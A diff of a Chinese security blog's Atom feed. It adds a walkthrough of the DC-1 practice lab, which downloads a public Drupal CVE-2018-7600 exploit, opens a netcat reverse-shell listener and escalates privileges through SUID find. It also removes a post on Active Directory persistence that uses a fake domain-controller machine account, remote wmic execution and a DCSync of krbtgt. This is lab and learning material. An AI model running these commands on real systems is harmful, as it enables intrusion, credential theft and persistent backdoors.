@@ -2,7 +2,7 @@
 <feed xmlns="http://www.w3.org/2005/Atom">
     <id>https://V-alkoinen.github.io</id>
     <title>老白</title>
-    <updated>2022-04-13T11:44:13.933Z</updated>
+    <updated>2022-04-14T11:40:38.688Z</updated>
     <generator>https://github.com/jpmonette/feed</generator>
     <link rel="alternate" href="https://V-alkoinen.github.io"/>
     <link rel="self" href="https://V-alkoinen.github.io/atom.xml"/>
@@ -79,6 +79,51 @@ cd 39772
 <p><img src="https://V-alkoinen.github.io/post-images/1649850091574.png" alt="" loading="lazy"><br>
 <img src="https://V-alkoinen.github.io/post-images/1649850095945.png" alt="" loading="lazy"><br>
 <img src="https://V-alkoinen.github.io/post-images/1649850100090.png" alt="" loading="lazy"></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[DC-1]]></title>
+        <id>https://V-alkoinen.github.io/post/dc-1/</id>
+        <link href="https://V-alkoinen.github.io/post/dc-1/">
+        </link>
+        <updated>2022-03-25T11:27:09.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="目标">目标</h1>
+<p>  DC-1 172.16.70.139</p>
+<h1 id="过程">过程</h1>
+<p> 端口扫描<br>
+ <code>nmap -A -T4 -sV -O -p- 172.16.70.139</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649935761354.png" alt="" loading="lazy"><br>
+ 爆一下目录<br>
+ <code>dirb http://172.16.70.139</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649935838945.png" alt="" loading="lazy"><br>
+ 啥也没有，访问下web<br>
+ <code>http://172.16.70.139</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649935876288.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1649935880473.png" alt="" loading="lazy"><br>
+ drupal 7，注册一下<br>
+<img src="https://V-alkoinen.github.io/post-images/1649935909246.png" alt="" loading="lazy"><br>
+ 发现需要后台验证，直接找exp<br>
+ <code>curl https://raw.githubusercontent.com/firefart/CVE-2018-7600/master/poc.py -o exp2.py</code><br>
+<img src="https://V-alkoinen.github.io/post-images/1649935949442.png" alt="" loading="lazy"></p>
+<pre><code>nc -nvlp 9999
+python3 exp2.py
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1649935974433.png" alt="" loading="lazy"><br>
+ 试一下suid</p>
+<pre><code>python -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+curl https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py -o suid.py
+chmod +x suid.py
+python suid.py
+</code></pre>
+<p><img src="https://V-alkoinen.github.io/post-images/1649936017446.png" alt="" loading="lazy"><br>
+<img src="https://V-alkoinen.github.io/post-images/1649936022620.png" alt="" loading="lazy"><br>
+ find提权</p>
+<pre><code>touch 1
+find 1 -exec 'whoami' \;
+find 1 -exec '/bin/sh' \;
+find 1 -exec '/bin/bash' -q \;
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://V-alkoinen.github.io/post-images/1649936103236.png" alt="" loading="lazy"></figure>
 ]]></content>
     </entry>
     <entry>
@@ -600,57 +645,6 @@ yum update polkit -y
 <pre><code>sudo apt-get update
 sudo apt-get install policykit-1
 </code></pre>
-]]></content>
-    </entry>
-    <entry>
-        <title type="html"><![CDATA[userAccountControl权限维持]]></title>
-        <id>https://V-alkoinen.github.io/post/useraccountcontrol-quan-xian-wei-chi/</id>
-        <link href="https://V-alkoinen.github.io/post/useraccountcontrol-quan-xian-wei-chi/">
-        </link>
-        <updated>2022-01-14T08:50:48.000Z</updated>
-        <content type="html"><![CDATA[<h1 id="一-漏洞详情">一、漏洞详情</h1>
-<p> ·1、<a href="https://twitter.com/kaidja/status/1480212323818217479">Create a fake computer account and change the UserAccountControl value to 8192. Now the AD thinks it is a domain controller.</a><br>
- ·2、<a href="https://stealthbits.com/blog/server-untrust-account/">Active Directory persistence through userAccountControl manipulation</a><br>
- ·3、<a href="https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties">Use the UserAccountControl flags to manipulate user account properties</a><br>
- 概要：该漏洞主要用于权限维持，当攻击者拿下域控后，可以创建一个机器账户，并通过特殊手段，将该账户提权至域控，此时机器账户可以作为后门使用。</p>
-<h1 id="二-漏洞用法">二、漏洞用法</h1>
-<pre><code>#创建机器账户
-New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Heo!&quot; -Force -AsPlainText)
-
-#修改userAccountControl
-Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}
-
-#验证是否被识别为域控
-Get-ADGroupMember -Identity &quot;Domain Controllers&quot; 
-或
-net group &quot;domain controllers&quot; /domain
-
-#以机器账户打开cmd
-runas /user:&lt;domian&gt;\SecTest2$ /netonly cmd
-
-#Run the Dcsync command 
-lsadump::dcsync /user:krbtgt
-</code></pre>
-<h1 id="三-漏洞复现过程">三、漏洞复现过程</h1>
-<p> 1、攻击前仅有一个域控<br>
-<code>net group &quot;domain controllers&quot; /domain</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1642847423381.png" alt="" loading="lazy"><br>
- 2、此时，假设我们通过hash传递获取了一个拥有域管权限的shell<br>
-<img src="https://V-alkoinen.github.io/post-images/1642847518854.png" alt="" loading="lazy"><br>
- 执行下面命令</p>
-<pre><code>#创建机器账户
-wmic /node:'ad-m' process call create &quot;cmd /c powershell New-ADComputer -Name SecTest2 -AccountPassword (ConvertTo-SecureString -String &quot;Hello1234!&quot; -Force AsPlainText)&quot;
-
-#修改userAccountControl
-wmic /node:'ad-m' process call create &quot;cmd /c powershell Set-ADObject -Identity (Get-ADComputer -Identity SecTest2) -Replace @{userAccountControl=8192}&quot;
-</code></pre>
-<p><img src="https://V-alkoinen.github.io/post-images/1642847721345.png" alt="" loading="lazy"><br>
- 3、查看域控，发现已有两个域管<br>
-<code>net group &quot;domain controllers&quot; /domain</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1642847761163.png" alt="" loading="lazy"><br>
- 4、后续即使修改域管密码，我们依然可以通过我们创建的机器账户回复域管权限（可以使用mimikatz同步哈希）<br>
-<code>runas /user:&lt;domain&gt;\SecTest2$ /netonly cmd1</code><br>
-<img src="https://V-alkoinen.github.io/post-images/1642847979300.png" alt="" loading="lazy"></p>
 ]]></content>
     </entry>
 </feed>
